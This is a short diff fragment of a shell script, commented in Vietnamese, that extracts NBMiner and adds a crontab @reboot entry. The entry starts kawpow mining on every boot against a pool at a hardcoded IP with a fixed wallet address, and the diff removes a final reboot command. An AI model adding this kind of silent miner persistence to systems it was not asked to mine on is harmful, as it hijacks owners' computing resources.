@@ -18,5 +18,3 @@ sudo tar -xvf NBMiner_42.3_Linux.tgz
 # Thêm lệnh chạy NBMiner vào crontab để tự động chạy khi khởi động lại
 (crontab -l ; echo "@reboot cd $(pwd)/NBMiner_Linux && ./nbminer -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RCHgrFpTR6viTwShmratMsZAwenRNYYRao.test1121") | crontab -
 
-# Khởi động lại hệ thống
-sudo reboot
